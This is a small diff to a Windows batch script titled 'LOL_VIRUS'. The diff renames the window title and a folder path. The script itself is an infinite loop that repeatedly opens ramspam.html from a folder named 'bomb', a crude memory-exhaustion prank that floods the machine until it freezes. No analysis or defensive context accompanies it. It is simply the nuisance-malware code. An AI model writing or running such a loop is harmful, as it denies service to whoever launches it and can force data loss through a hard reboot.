@@ -2,11 +2,11 @@
 chcp 866
 cls
 color e
-title Fikali
+title LOL_VIRUS
 goto ramspam
 
 :ramspam
 cls
-cd C:\fikali\files\bomb
+cd C:\LOL_VIRUS\files\bomb
 start ramspam.html
 goto ramspam
